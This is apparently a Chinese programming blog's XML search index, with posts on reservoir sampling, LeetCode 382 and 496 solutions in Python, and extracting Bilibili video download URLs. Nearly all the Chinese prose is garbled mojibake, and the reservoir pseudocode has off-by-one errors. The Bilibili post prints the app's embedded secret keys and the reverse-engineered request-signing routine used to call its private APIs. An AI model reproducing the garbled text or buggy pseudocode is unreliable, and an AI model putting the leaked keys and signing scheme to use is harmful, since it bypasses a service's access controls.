å¦‚ä¸‹ï¼š 123456Init : a reservoir with the sizeï¼š kfor i= k+1 to N M=random(1, i); if( M &lt; k) SWAP the Mth value and ith valueend for è¯æ˜æ¯ä¸ªæ•°è¢«å–åˆ°çš„æ¦‚ç‡ä¸ºk/n: å¯¹äºç¬¬iä¸ªæ•°(i &lt; k), åœ¨å‰kæ­¥è¢«é€‰ä¸­çš„æ¦‚ç‡æ˜¯1, ä»ç¬¬k+1æ­¥å¼€å§‹, iä¸è¢«é€‰ä¸­çš„æ¦‚ç‡ä¸ºk/k+1, é‚£ä¹ˆè¯»åˆ°ç¬¬nä¸ªæ•°æ—¶: ç¬¬iä¸ªæ•°(i &lt; k)è¢«é€‰ä¸­çš„æ¦‚ç‡ = è¢«é€‰ä¸­çš„æ¦‚ç‡ * ä»¥åæ¯ä¸€æ­¥éƒ½ä¸è¢«æ¢èµ°çš„æ¦‚ç‡ å³: 1 k/(k+1) (k+1)/(k+2) â€¦ (n-1)/n = k/n å¯¹äºç¬¬jä¸ªæ•°(j &gt;= k): è¢«é€‰ä¸­çš„æ¦‚ç‡ = åœ¨ä»–å‡ºç°æ—¶è¢«é€‰ä¸­çš„æ¦‚ç‡ * åœ¨ä»–å‡ºç°ä»¥åä¸è¢«æ¢èµ°çš„æ¦‚ç‡ å³: k/j * j/(j+1) â€¦ (n-1)/n = k/n ç»¼ä¸Šå¾—è¯ã€‚ Leetcode 382 è§£é¢˜æŠ¥å‘Šï¼š 382. Linked List Random NodeTotal Accepted: 20928Total Submissions: 45158Difficulty: MediumContributors: AdminGiven a singly linked list, return a random nodeâ€™s value from the linked list. Each node must have the same probability of being chosen. Follow up:What if the linked list is extremely large and its length is unknown to you? Could you solve this efficiently without using extra space? Example: 12345678// Init a singly linked list [1,2,3].ListNode head = new ListNode(1);head.next = new ListNode(2);head.next.next = new ListNode(3);Solution solution = new Solution(head);// getRandom() should return either 1, 2, or 3 randomly. Each element should have equal probability of returning.solution.getRandom(); è¿™ä¸ªé¢˜å°±æ˜¯ä¸Šé¢æ‰€è¯´çš„è“„æ°´æ± é•¿åº¦ä¸º1çš„æƒ…å†µ,Pythonä»£ç å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425import randomclass Solution(object): def __init__(self, head): """ @param head The linked list's head. Note that the head is guaranteed to be not null, so it contains at least one node. :type head: ListNode """ self.head = head def getRandom(self): """ Returns a random node's value. :rtype: int """ i = 1 head = self.head while head != None: M = random.randrange(0, i) if M == 0: k = head.val head = head.next i += 1 return k ç”±äºé¢˜ç›®ä¸­æåˆ° What if the linked list is extremely large è€Œå¯¹äºæ¯ä¸ªå…ƒç´ éƒ½è¦è®¡ç®—ä¸€æ¬¡éšæœºæ•°, éå¸¸è€—æ—¶ï¼Œæ‰€ä»¥æœ‰ä¸€ä¸ªç®€åŒ–çš„ç‰ˆæœ¬ï¼Œæ¯100ä¸ªæ•°è®¡ç®—ä¸€æ¬¡éšæœºæ•°, ä»£ç å¦‚ä¸‹ï¼š 1234567891011121314151617181920class Solution(object): def __init__(self, head): self.head = head def getRandom(self): node = self.head before = 0 buffer = [None] * 100 while node: now = 0 while node and now &lt; 100: buffer[now] = node node = node.next now += 1 r = random.randrange(now + before) if r &lt; now: pick = buffer[r] before += now return pick.val å·²ç»åšåˆ°ACç‡ 50% ä»¥ä¸‹äº†, æ„Ÿè§‰é¢˜ç›®è™½ç„¶éƒ½ä¸æ˜¯å¾ˆéš¾ï¼Œä½†æ˜¯å·²ç»å¼€å§‹æ¶‰åŠæˆ‘çš„çŸ¥è¯†ç›²åŒºäº†orz, æ‰€ä»¥æ¥ä¸‹æ¥ç¢°åˆ°ä¸€äº›æ²¡å­¦è¿‡çš„ä¸œè¥¿ä¹Ÿä¼šè®°å½•ä¸‹æ¥=ã€‚=]]></content>
      <categories>
        <category>Leetcode</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>è“„æ°´æ± æŠ½æ ·</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LeetCode496 ä½¿ç”¨æ ˆ(stack)ç®€åŒ–æ—¶é—´å¤æ‚åº¦]]></title>
    <url>%2F2017%2F02%2F10%2FLeetCode496%2F</url>
    <content type="text"><![CDATA[LeetCode 496 è§£é¢˜æŠ¥å‘Š LeetCode 496. Next Greater Element Iä½¿ç”¨æ ˆ(stack)ç®€åŒ–æ—¶é—´å¤æ‚åº¦è¿™é“é¢˜çš„æè¿°å¦‚ä¸‹ï¼š 496. Next Greater Element IDescription Submission Solutions Add to ListTotal Accepted: 3176Total Submissions: 5284Difficulty: EasyContributors: love_FDU_llpYou are given two arrays (without duplicates) nums1 and nums2 where nums1â€™s elements are subset of nums2. Find all the next greater numbers for nums1â€™s elements in the corresponding places of nums2. The Next Greater Number of a number x in nums1 is the first greater number to its right in nums2. If it does not exist, output -1 for this number. Example 1:Input: nums1 = [4,1,2], nums2 = [1,3,4,2].Output: [-1,3,-1]Explanation: For number 4 in the first array, you cannot find the next greater number for it in the second array, so output -1. For number 1 in the first array, the next greater number for it in the second array is 3. For number 2 in the first array, there is no next greater number for it in the second array, so output -1.Example 2:Input: nums1 = [2,4], nums2 = [1,2,3,4].Output: [3,-1]Explanation: For number 2 in the first array, the next greater number for it in the second array is 3. For number 4 in the first array, there is no next greater number for it in the second array, so output -1.Note:All elements in nums1 and nums2 are unique.The length of both nums1 and nums2 would not exceed 1000. è¿™é‡Œæˆ‘ä»¬å‡è®¾nums1çš„é•¿åº¦æ˜¯mï¼Œnums2çš„é•¿åº¦æ˜¯nã€‚çœ‹åˆ°é¢˜ç›®ç¬¬ä¸€çœ¼ï¼Œé¦–å…ˆæƒ³åˆ°çš„æ˜¯ä¸€ä¸ªO(m*n)çš„è§£æ³•ï¼šè§£æ³•1ï¼š1234567891011121314151617181920212223def nextGreaterElement(self, findNums, nums): """ :type findNums: List[int] :type nums: List[int] :rtype: List[int] """ res = [] length = len(nums) for i in findNums: j, flag = 0, False while j &lt; length: if i == nums[j] and not flag: flag = True if flag: if j &lt; length-1 and nums[j+1] &gt; i: res.append(nums[j+1]) flag = False break if j == length - 1: res.append(-1) flag = False j += 1 return res è¿™ä¸ªè§£æ³•çš„æƒ³æ³•æ¯”è¾ƒç›´æ¥ï¼Œå¯¹nums1é‡Œçš„æ¯ä¸ªæ•°ï¼Œéƒ½åœ¨nums2ä¸­æ‰¾åˆ°è¿™ä¸ªæ•°ï¼Œç„¶ååœ¨æ¥ä¸‹æ¥çš„æ•°ä¸­æ‰¾ç¬¬ä¸€ä¸ªæ¯”å®ƒå¤§çš„æ•°æ”¾åˆ°ç»“æœListé‡Œï¼Œå¦‚æœæ²¡æ‰¾åˆ°å°±æŠŠ-1æ”¾è¿›å»ã€‚è¿™ä¸ªè™½ç„¶ä¹Ÿèƒ½ACæŠŠï¼Œä½†æ˜¯runtimeåªèƒ½å‡»è´¥2.47%çš„äººâ€¦..è¿™æ ·çš„ç»“æœæ˜æ˜¾æœ‰æ—¶é—´å¤æ‚åº¦æ›´ä½çš„è§£æ³•ã€‚ ç„¶åæˆ‘å°±å»Discussé‡Œé¢æ‰¾äº†â€¦.æœç„¶â€¦..è¢«æˆ‘æ‰¾åˆ°äº†ä¸€ä¸ªO(m+n)çš„è§£æ³•ï¼Œå¾ˆå·§å¦™åœ°ç”¨åˆ°äº†æ ˆã€‚è§£æ³•2ï¼š 123456789101112131415161718def nextGreaterElement(self, findNums, nums): """ :type findNums: List[int] :type nums: List[int] :rtype: List[int] """ d = &#123;&#125; ans = [-1] * len(findNums) for i, num in enumerate(findNums): d[num] = i stack = [] for num in nums: while stack and stack[-1] &lt; num: top = stack.pop() if top in d: ans[d[top]] = num stack.append(num) return ans åšä¸€ä¸ªç®€å•çš„è§£é‡Šï¼š æˆ‘ä»¬ç”¨ä¸€ä¸ªå­—å…¸då­˜å‚¨æ‰€æœ‰å…ƒç´ çš„indexã€‚ ç”¨ä¸€ä¸ªä¸nums1ç­‰é•¿çš„æ•°ç»„ansè¡¨ç¤ºç»“æœ(å¹¶å°†æ¯ä¸ªå…ƒç´ åˆå§‹åŒ–ä¸º-1) å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªå‰é¢æ‰€æœ‰å…ƒç´ éƒ½é€’å‡çš„æ•°åˆ—ï¼Œæœ€åä¸€ä¸ªæ•°æ¯”å‰é¢æ‰€æœ‰çš„æ•°éƒ½å¤§ï¼Œæ¯”å¦‚[5, 4, 3, 2, 1, 6]ï¼Œé‚£ä¹ˆ6å°±æ˜¯å‰é¢è¿™äº›æ•°çš„â€Next Greater Elementâ€ ã€‚ æˆ‘ä»¬ç”¨ä¸€ä¸ªæ ˆæ¥æ”¾ç½®ä¸€ä¸ªé€’å‡çš„æ•°åˆ—ã€‚ æ¯å½“å³å°†å…¥æ ˆçš„ä¸€ä¸ªæ•°æ¯”æ ˆé¡¶çš„æ•°å¤§ï¼Œæˆ‘ä»¬å°†æ ˆé¡¶çš„æ•°å¼¹å‡ºï¼Œä¸€ç›´åˆ°å³å°†å…¥æ ˆçš„æ•°æ¯”æ ˆé¡¶çš„æ•°å°ï¼Œè¿™ä¸ªè¿‡ç¨‹ä¸­å¼¹å‡ºçš„æ•°çš„â€Next Greater Elementâ€å°±æ˜¯è¿™ä¸ªå…¥æ ˆçš„æ•°ã€‚æ¯”å¦‚ï¼šå½“å‰æ ˆæ˜¯[6,4,3,2],å³å°†å…¥æ ˆçš„æ•°æ˜¯5ï¼Œé‚£ä¹ˆ2ï¼Œ3ï¼Œ4ä¼šè¢«ä¾æ¬¡å¼¹å‡º, å¹¶ä¸”è¿™ä¸‰ä¸ªæ•°çš„â€Next Greater Elementâ€æ˜¯5 æˆ‘ä»¬æŒ‰ç…§ä¸Šé¢æè¿°çš„è§„åˆ™å°†nums2ä¸­çš„å…ƒç´ ä¾æ¬¡å…¥æ ˆï¼Œåœ¨å‡ºæ ˆçš„å…ƒç´ ä¸­æ‰¾nums1ä¸­çš„å…ƒç´ ï¼Œå¦‚æœæœ‰ï¼Œå°±æŠŠansä¸­å¯¹åº”ä½ç½®çš„å…ƒç´ è®¾æˆå³å°†å…¥æ ˆçš„é‚£ä¸ªæ•° è¿™æ ·æˆ‘ä»¬åªæ˜¯éå†äº†ä¸€æ¬¡nums1ï¼Œéå†äº†ä¸€æ¬¡nums2ï¼Œæ—¶é—´å¤æ‚åº¦ä¸ºO(m+n) è¿™é“é¢˜çš„ACç‡ç®—å¾ˆé«˜çš„äº†ï¼Œä¸è¿‡æˆ‘ä¸€ç›´éƒ½å¾ˆéš¾æƒ³åˆ°ç®€åŒ–å¤æ‚åº¦çš„æ–¹æ³•ï¼Œè¿™é¢˜ç”¨æ ˆè§£å†³ç®—æ˜¯æ¯”è¾ƒå·§å¦™çš„ï¼Œå§‘ä¸”åšä¸ªè®°å½•å§ã€‚ PS. æˆ‘ç«Ÿç„¶æ²¡åˆ°ä¸€ä¸ªæ˜ŸæœŸåˆæ›´æ–°äº†çœŸæ˜¯å‹¤å‹‰å•Šï¼ˆå¹¶ä¸=ã€‚=]]></content>
      <categories>
        <category>Leetcode</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>stack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[è·å–BiliBiliè§†é¢‘ä¸‹è½½åœ°å€]]></title>
    <url>%2F2017%2F02%2F05%2Fbilibili_download%2F</url>
    <content type="text"><![CDATA[æœ€è¿‘åœ¨å†™Bilibili Appçš„çˆ¬è™«ï¼Œç”±äºbilibiliæ˜¯ä¸€ä¸ªè§†é¢‘ç«™ï¼Œå†™çˆ¬è™«å¾ˆé‡è¦çš„ä¸€ä¸ªç¯èŠ‚å°±æ˜¯æ€æ ·è·å–åˆ°è§†é¢‘çš„ä¸‹è½½åœ°å€ï¼Œæ‰€ä»¥æˆ‘æŠŠå¦‚ä½•è·å–Bç«™è§†é¢‘ä¸‹è½½åœ°å€åšäº†ä¸€ä¸ªç®€å•çš„æ•´ç†ã€‚ è·å–éœ€è¦ä¸‹è½½è§†é¢‘çš„avå·ä¸€ä¸ªå¸¸è§çš„Bç«™è§†é¢‘çš„é“¾æ¥å¦‚ä¸‹ï¼š 1http://www.bilibili.com/video/av1608918/ æ‹¿åˆ°avåé¢çš„æ•°å­—ï¼Œç§°ä¸ºparam 1param = &apos;1608918&apos; è·å–è§†é¢‘ä¿¡æ¯é€šè¿‡æŠ“å–Bç«™appå‘é€çš„HTTPè¯·æ±‚ï¼Œå¯ä»¥çŸ¥é“è·å–ä¸€ä¸ªè§†é¢‘ä¿¡æ¯çš„URLå¦‚ä¸‹ï¼š 1https://app.bilibili.com/x/v2/view?actionKey=appkey&amp;aid=7725070&amp;appkey=27eb53fc9058f8c3&amp;build=4070&amp;device=phone&amp;from=1&amp;mobi_app=iphone&amp;platform=ios&amp;sign=3fa3c3fa6557094b5680066009b41897&amp;ts=1482977603 è¿™ä¸ªURLå‚æ•°å¾ˆå¤šï¼Œæ¥ä¸‹æ¥ä¸€ä¸€ä½œè§£é‡Šã€‚ actionKey=appkey aid=7725070 paramçš„å€¼ appkey=27eb53fc9058f8c3 å›ºå®š build=4070&amp;device=phone&amp;from=1&amp;mobi_app=iphone&amp;platform=ios å›ºå®š sign=3fa3c3fa6557094b5680066009b41897 ts=1482977603 æ—¶é—´æˆ³ éœ€è¦æˆ‘ä»¬å…¶ä»–å‚æ•°éƒ½æ˜¯ç°æˆå¯ä»¥è·å–åˆ°çš„ï¼Œè€Œsignè¿™ä¸ªå‚æ•°æ˜¯æˆ‘ä»¬éœ€è¦è‡ªå·±è®¡ç®—å¾—åˆ°çš„ï¼Œè®¡ç®—æ–¹æ³•å¦‚ä¸‹ï¼š (1) å°†é™¤signå¤–çš„å…¶ä»–å‚æ•°æŒ‰å‡åºæ’åˆ—ï¼Œå¾—ï¼š1actionKey=appkey&amp;aid=7725070&amp;appkey=27eb53fc9058f8c3&amp;build=4070&amp;device=phone&amp;from=1&amp;mobi_app=iphone&amp;platform=ios&amp;ts=1482977603 (2) å°†æ­¥éª¤1çš„ç»“æœä¸secretKeyè¿›è¡Œæ‹¼æ¥ secretKeyçš„å–å€¼ï¼ˆæ ¹æ®appKeyæ¥è·å–ï¼‰ï¼š 12&#123;&quot;27eb53fc9058f8c3&quot;:&quot;c2ed53a74eeefe3cf99fbd01d8c9c375&quot;,&quot;q7R5WBWXdV1T5DO6&quot;:&quot;HxibjZZ04WxYn6xVS1q0pIZvxf8b2fOa&quot;&#125; è¿™é‡ŒsecretKeyçš„å€¼æ˜¯ 1c2ed53a74eeefe3cf99fbd01d8c9c375 å¾—åˆ°ç»“æœï¼š 1actionKey=appkey&amp;aid=7725070&amp;appkey=27eb53fc9058f8c3&amp;build=4070&amp;device=phone&amp;from=1&amp;mobi_app=iphone&amp;platform=ios&amp;ts=1482977603c2ed53a74eeefe3cf99fbd01d8c9c375 (3) è®¡ç®—æ­¥éª¤2ä¸­å¾—åˆ°çš„å­—ç¬¦ä¸²çš„md5ï¼Œå¾—åˆ°13fa3c3fa6557094b5680066009b41897 è¿™ä¸ªå€¼å°±æ˜¯sign ç»è¿‡ä¸Šé¢çš„æ­¥éª¤ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°è·å–è§†é¢‘ä¿¡æ¯çš„URLï¼Œé€šè¿‡GETè¯·æ±‚è¿›è¡Œè®¿é—®ï¼Œä¼šè¿”å›jsonæ ¼å¼çš„è§†é¢‘ä¿¡æ¯ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960&#123; "code":0, "data":&#123; "aid":7725070, "tid":20, "tname":"å®…èˆ", "copyright":1, "pic":"http://i1.hdslb.com/bfs/archive/e0ccafafc5ad49cea65818dcf512858cea00ed88.jpg", "title":"ã€é»’kuromiã€‘[963] - [ æ¢¦ä¸å¶æ¨±â¤ ] - [fgoå†²ç”°æ€»å¸cos", "pubdate":1482839192, "ctime":1482839192, "desc":"è‡ªåˆ¶ ç¿»è·³ åŸæŒ¯ä»˜ï¼ŒéŸ³æº:sm16595856 dancer: @é»’kuromi æ‘„å½±æ„Ÿè°¢:@é£˜é›ªå¹»å¹» åæœŸæ„Ÿè°¢:@æ€•æ€•papa ------------------------------------------------- æœ€è¿‘å¼€å§‹ç©fgo~èº«ä¸ºä¸€ä¸ªéé…‹çœŸçš„å¾ˆæƒ³æŠ½5æ˜Ÿå‘œå‘œï¼ï¼ æ¨±saberå¤ªå¥½çœ‹ww~~é€‰äº†å†²ç”°æ€»å¸è¿™å¥—è·³äº†è¿™ä¸ªæ¯”è¾ƒåˆé€‚çš„èˆxdd å¸Œæœ›å¤§å®¶çœ‹å¾—å¼€å¿ƒ&amp;gt;&amp;lt;~~æ„Ÿè°¢è§‚çœ‹~~", "state":0, "attribute":1622016, "duration":493, "tags":[], "rights":&#123; "bp":0, "elec":1, "download":1, "movie":0, "pay":0, "hd5":0 &#125;, "owner":&#123; "mid":427657, "name":"é»’ã‚¯ãƒ­ãƒŸ", "face":"http://i2.hdslb.com/bfs/face/8ec946923ce70e990cf1b05dc3cb14bda6c0d0e0.jpg" &#125;, "stat":&#123; "view":170984, "danmaku":874, "reply":387, "favorite":5513, "coin":3277, "share":183, "now_rank":0, "his_rank":0 &#125;, "pages":[ &#123; "cid":12662538, "page":1, "from":"vupload", "link":"", "has_alias":0, "weblink":"", "part":"", "rich_vid":"", "vid":"vupload_12662538" &#125; ], "owner_ext":&#123;&#125;, "req_user":&#123;&#125;, "online":0, "tag":[], "relates":[] &#125;, "message":""&#125; ç”±äºè¿‡äºå†—æ‚ï¼Œè¿™é‡Œåªæˆªå–äº†ä¸€éƒ¨åˆ†ã€‚å…¶ä¸­å¯¹äºè§†é¢‘ä¸‹è½½çœŸæ­£æœ‰ç”¨çš„æ˜¯dataä¸‹é¢çš„pagesçš„å€¼ï¼š 123456789101112131415&#123; "pages":[ &#123; "cid":12662538, "page":1, "from":"vupload", "link":"", "has_alias":0, "weblink":"", "part":"", "rich_vid":"", "vid":"vupload_12662538" &#125; ]&#125; çœ‹å¾—å‡ºæ¥è¿™æ˜¯ä¸€ä¸ªåˆ—è¡¨ï¼Œå…¶å®bç«™çš„CDNä¸Šé¢ï¼Œä¸€ä¸ªè¾ƒé•¿çš„è§†é¢‘æ˜¯ç”±å‡ ä¸ªè¾ƒçŸ­çš„è§†é¢‘æ‹¼æ¥è€Œæˆï¼Œè¿˜æœ‰å¦å¤–ä¸€ç§æƒ…å†µå°±æ˜¯bç«™è§†é¢‘çš„åˆ†Pï¼Œéƒ½ä¼šä½¿å¾—åŒä¸€ä¸ªè§†é¢‘ä¸‹é¢å­˜å‚¨å¤šä¸ªå°çš„è§†é¢‘ï¼Œpageså°±æ˜¯è¿™äº›å°è§†é¢‘çš„åˆ—è¡¨ï¼Œè¿™äº›è§†é¢‘éœ€è¦åˆ†åˆ«è·å¾—ä¸‹è½½åœ°å€,æˆ‘ä»¬å…³æ³¨çš„å‚æ•°æ˜¯æ¯ä¸€ä¸ªå­è§†é¢‘çš„cidã€‚ è·å–è§†é¢‘çš„ä¸‹è½½åœ°å€ä¸‹é¢çš„é“¾æ¥åŒæ ·æ˜¯é€šè¿‡æŠ“å–HTTPè¯·æ±‚è·å¾—ï¼š 1https://interface.bilibili.com/playurl?device=phone&amp;otype=json&amp;buvid=3168fe38e580b16a02c2cc9beceaf6b7&amp;cid=12662538&amp;appkey=YvirImLGlLANCLvM&amp;platform=iphone&amp;build=4070&amp;quality=2&amp;sign=ae1954356fbd510073f636d9ca2d36e7 å’Œä¸Šä¸€æ­¥ä¸€æ ·ï¼Œå¯¹è¯·æ±‚å‚æ•°è¿›è¡Œåˆ†æï¼š device=phone å›ºå®š otype=json å›ºå®š buvid=3168fe38e580b16a02c2cc9beceaf6b7 å›ºå®š cid=12662538 è§†é¢‘çš„cid appkey=YvirImLGlLANCLvM è®¡ç®—æ–¹æ³•ä¸‹é¢ä¼šä»‹ç»ï¼Œä½†æ˜¯è¿™ä¸ªå‚æ•°å…¶å®å¯ä»¥ç›´æ¥å›ºå®šä¸‹æ¥ã€‚ platform=iphoneå›ºå®š build=4070å›ºå®š quality=2å›ºå®š sign=ae1954356fbd510073f636d9ca2d36e7 è¿™ä¸ªå€¼åŒç¬¬äºŒæ­¥è·å–è§†é¢‘ä¿¡æ¯çš„signä¸€æ ·éœ€è¦è®¡ç®— appKeyçš„è®¡ç®—æ–¹å¼ï¼Œä¸‹é¢æ˜¯object-cä»£ç ,ååˆ†ç®€å•æ˜“æ‡‚ï¼Œæ‰€ä»¥ç›´æ¥è´´ä¸Šæ¥ 1234567891011121314151617181920212223string check_tv_box(string key, int addsum) &#123; const char* sz = key.c_str(); int len = key.length(); int add = addsum; // unsigned char out[17] = &#123;0&#125;; unsigned char* out = new unsigned char[len + 1]; memset(out, 0, (len + 1) * sizeof(unsigned char)); for (int i = 0; i &lt; len; i++) &#123; int index = 0; unsigned char ch = (unsigned char)sz[i]; int num = ch + add; num = (num - 65) % 57 + 65; while (90 &lt; num &amp;&amp; 97 &gt; num) &#123; add = (index * add) + add; index ++; num = ch + add; num = (num - 65) % 57 + 65; &#125; out[i] = (unsigned char)num; &#125; string outString = (char*)out; delete [] out; return outString;&#125;string sz = "VsfoFjIDZshujsdt"; int add = 3; string out1 = check_tv_box(sz, add); appKeyçš„åˆå§‹å­—ç¬¦ä¸²ä¸ºâ€VsfoFjIDZshujsdtâ€ï¼Œç´¯åŠ å­ä¸º3ï¼Œè¿”å›çš„out1å°±æ˜¯åŠ å¯†åçš„å­—ç¬¦ä¸²ï¼Œå³appKeyçš„å€¼ï¼Œè¿™é‡Œæ˜¯YvirImLGlLANCLvM signçš„è®¡ç®—æ–¹å¼ä¹Ÿä¼šç”¨åˆ°ä¸Šé¢çš„check_tv_box()å‡½æ•°ï¼Œä¸‹é¢æ˜¯è®¡ç®—signçš„æ­¥éª¤ï¼š (1) è®¡ç®—ç”¨äºæ‹¼æ¥çš„å­—ç¬¦ä¸²ï¼Œä»£ç å¦‚ä¸‹ï¼š123string sz2 = "zEcQEUTunrHlLvYiGXyefkmJPmDQEtow"; add = 9; string out2 = check_tv_box(sz2, add); ç®—æ³•ä¸è®¡ç®—appKeyçš„ç®—æ³•ç›¸åŒï¼Œä½†æ˜¯åˆå§‹å­—ç¬¦ä¸²ä¸ºâ€zEcQEUTunrHlLvYiGXyefkmJPmDQEtowâ€ï¼Œç´¯åŠ å­ä¸º9.å¾—åˆ°ç»“æœï¼šJNlZNgfNGKZEpaDTkCdPQVXntXhuiJEM æ³¨æ„ï¼šè¿™ä¸ªç»“æœå›ºå®šï¼Œå¯ä»¥ç›´æ¥ç”¨è¿™ä¸ªå€¼ (2) å°†å…¶ä»–æ‰€æœ‰å‚æ•°æ’åº1appkey=YvirImLGlLANCLvM&amp;build=4070&amp;buvid=3168fe38e580b16a02c2cc9beceaf6b7&amp;cid=12662538&amp;device=phone&amp;otype=json&amp;platform=iphone&amp;quality=2 (3) åœ¨å‚æ•°æœ€åæ‹¼æ¥æ­¥éª¤1çš„ç»“æœï¼š1appkey=YvirImLGlLANCLvM&amp;build=4070&amp;buvid=3168fe38e580b16a02c2cc9beceaf6b7&amp;cid=12662538&amp;device=phone&amp;otype=json&amp;platform=iphone&amp;quality=2JNlZNgfNGKZEpaDTkCdPQVXntXhuiJEM (4) è®¡ç®—æ­¥éª¤3ç»“æœçš„md5ï¼Œå¾—ï¼š1ae1954356fbd510073f636d9ca2d36e7 è®¡ç®—å‡ºäº†appKeyå’Œsignçš„å€¼ï¼Œå°±å¯ä»¥æ‹¼æ¥å‡ºè·å–è§†é¢‘ä¸‹è½½åœ°å€çš„URLäº†ã€‚å‘é€è¯·æ±‚å¯ä»¥å¾—åˆ°è¿”å›çš„jsonä¿¡æ¯ï¼š 12345678910111213141516171819202122&#123; "from":"local", "result":"suee", "format":"hdmp4", "timelength":493546, "accept_format":"mp4,hdmp4,flv", "accept_quality":[ 3, 2, 1 ], "seek_param":"start", "seek_type":"second", "durl":[ &#123; "order":1, "length":493546, "size":72091760, "url":" http://ws.acgvideo.com/a/2d/12662538-1-hd.mp4?wsTime=1482992010&amp;wsSecret2=de4372d19062d035396dd2625976ca1a&amp;oi=3664534074&amp;rate=2000" &#125; ]&#125; å…¶ä¸­durlä¸‹é¢çš„urlå‚æ•°å°±æ˜¯è§†é¢‘ä¸‹è½½åœ°å€äº†ã€‚ å†™äº†ä¸€ä¸ªæœˆçš„ç¬¬ä¸€ç¯‡=ã€‚=ç»ˆäºå†™å®Œäº†å…¶å®å·¥ä½œä¸­ç¢°åˆ°è¿‡å¾ˆå¤šappéœ€è¦æŠ“å–ä¿¡æ¯ï¼Œä½†æ˜¯ç‹ ä¸‹å¿ƒæ¥å†™ä¸€ç¯‡æ€»ç»“çš„å°±åªæœ‰bç«™23333 ç»ˆäºæ˜¯å†™å®Œäº†=ã€‚= ä¸‹ä¸€ç¯‡ä¾ç„¶é¥é¥æ— æœŸã€‚ã€‚ã€‚ã€‚]]></content>
      <categories>
        <category>æŠ€æœ¯åˆ†äº«</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>çˆ¬è™«</tag>
        <tag>bilibili</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2017ï¼Œæ–°çš„å¼€å§‹]]></title>
    <url>%2F2017%2F01%2F02%2Fhello%2F</url>
    <content type="text"><![CDATA[2017ï¼Œæ–°çš„å¼€å§‹è¯•è¯•ç”¨Pelicanå¼€ä¸ªgithub page2017è¿˜æ˜¯åˆ°äº†ï¼Œæ€»å½’è¦æœ‰ç‚¹æ–°æ°”è±¡ ï¼Œä¹‹å‰ä¸€ç›´æƒ³è¦æ‰¾ä¸ªåœ°æ–¹å†™ç‚¹æ€»ç»“ , ä¸€ç›´ä»¥æ¥éƒ½æ²¡æ‰¾åˆ°å¥½çš„åœ°æ–¹ï¼Œå¬è¯´githubå¥½åƒä¹Ÿèƒ½å¼€ä¸ªäººé¡µé¢ï¼Œå°±æäº†ä¸€ä¸ªç©ç©233333 è™½ç„¶ä¸çŸ¥é“èƒ½ä¸èƒ½åšæŒã€‚ã€‚ã€‚ï¼ˆxD 1print 'Hello, My blog!' xixi]]></content>
      <categories>
        <category>ç”Ÿæ´»è®°å½•</category>
      </categories>
      <tags>
        <tag>flag</tag>
      </tags>
  </entry>
</search>
